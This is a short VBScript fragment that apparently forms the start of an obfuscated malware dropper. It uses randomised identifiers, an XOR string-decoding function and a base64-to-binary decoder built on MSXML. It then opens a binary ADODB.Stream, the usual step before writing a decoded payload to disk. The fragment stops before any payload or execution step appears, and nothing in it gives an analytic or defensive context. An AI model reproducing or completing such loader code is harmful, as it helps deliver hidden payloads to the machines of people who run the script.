Function IVqFyRKTcWvhx(a, k)
  Dim MOapuYmNtuJyOe, HtZQyqqJSl
  MOapuYmNtuJyOe = ""
  For HtZQyqqJSl = 1 To Len(a)
    MOapuYmNtuJyOe = MOapuYmNtuJyOe & Chr(Asc(Mid(a, HtZQyqqJSl, 1)) Xor k)
  Next
  IVqFyRKTcWvhx = MOapuYmNtuJyOe
End Function

Function VooAtNMutKo(s)
  Set mgynTMKnYFutoesO = CreateObject("MSXML2.DOMDocument")
  Set pajHCmkmGgtEGXA = mgynTMKnYFutoesO.createElement("tmp")
  pajHCmkmGgtEGXA.DataType = "bin.base64"
  pajHCmkmGgtEGXA.Text = s
  VooAtNMutKo = pajHCmkmGgtEGXA.NodeTypedValue
  Set mgynTMKnYFutoesO = Nothing
End Function

Set xSDuXXKKuLFgtfMm = CreateObject("ADODB.Stream")
xSDuXXKKuLFgtfMm.Type = 1
